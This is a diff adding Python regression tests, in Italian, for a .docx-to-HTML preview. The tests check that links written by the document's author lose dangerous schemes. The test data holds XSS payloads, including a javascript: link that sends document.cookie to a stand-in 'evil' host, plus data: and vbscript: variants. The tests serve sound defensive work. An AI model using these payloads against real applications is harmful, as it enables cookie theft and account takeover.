@@ -56,6 +56,83 @@ def test_html_da_docx_toglie_gli_script() -> None:
     assert "<script" not in html.lower()
 
 
+def _docx_con_collegamento(bersaglio: str, testo: str = "Apri l'allegato") -> bytes:
+    """Un .docx il cui collegamento punta dove vuole chi ha scritto il file."""
+    doc = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
+        ' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
+        f'<w:body><w:p><w:hyperlink r:id="rL"><w:r><w:t>{testo}</w:t>'
+        "</w:r></w:hyperlink></w:p></w:body></w:document>"
+    )
+    doc_rels = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+        f'<Relationship Id="rL" TargetMode="External" Target="{bersaglio}" '
+        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/>'
+        "</Relationships>"
+    )
+    rels = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+        '<Relationship Id="rId1" Target="word/document.xml" '
+        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"/>'
+        "</Relationships>"
+    )
+    types = (
+        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
+        '<Default Extension="xml" ContentType="application/xml"/>'
+        '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-'
+        'officedocument.wordprocessingml.document.main+xml"/></Types>'
+    )
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as z:
+        z.writestr("[Content_Types].xml", types)
+        z.writestr("_rels/.rels", rels)
+        z.writestr("word/_rels/document.xml.rels", doc_rels)
+        z.writestr("word/document.xml", doc)
+    return buf.getvalue()
+
+
+def test_un_collegamento_che_esegue_non_arriva_in_pagina() -> None:
+    """Il caso normale di questo prodotto: il .docx l'ha scritto un altro.
+
+    L'HTML dell'anteprima entra in pagina con `innerHTML`. mammoth emette
+    i collegamenti, e l'indirizzo di un collegamento lo sceglie chi ha
+    scritto il documento: `Target="javascript:..."` produceva
+    `<a href="javascript:fetch('http://evil/'+document.cookie)">`, che
+    passava indenne dalle due regex che c'erano prima (`<script>` e
+    `on*=`). Bastava un clic per eseguirlo nell'origine dell'app, che e'
+    la stessa che apre i documenti dell'utente.
+
+    Mutazione: rimettere la sanifica a regex -> questo torna rosso.
+    """
+    velenosi = [
+        "javascript:fetch('http://evil/'+document.cookie)",
+        "JaVaScRiPt:alert(1)",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "vbscript:msgbox(1)",
+    ]
+    for bersaglio in velenosi:
+        html = html_da_docx(_docx_con_collegamento(bersaglio))
+        basso = html.lower()
+        assert "javascript:" not in basso, bersaglio
+        assert "vbscript:" not in basso, bersaglio
+        assert "data:text/html" not in basso, bersaglio
+        # Il testo resta: si toglie l'indirizzo, non il contenuto da leggere.
+        assert "Apri l'allegato" in html, bersaglio
+
+
+def test_un_collegamento_normale_resta_cliccabile() -> None:
+    """Togliere tutti gli href renderebbe il controllo verde per costruzione."""
+    html = html_da_docx(_docx_con_collegamento("https://example.it/contratto"))
+    assert 'href="https://example.it/contratto"' in html
+    html_mail = html_da_docx(_docx_con_collegamento("mailto:mario.rossi@example.it"))
+    assert "mailto:mario.rossi@example.it" in html_mail
+
+
 def test_l_anteprima_da_le_due_versioni(client) -> None:
     dati = _docx("Contatta mario.rossi@example.it")
     r = client.post(
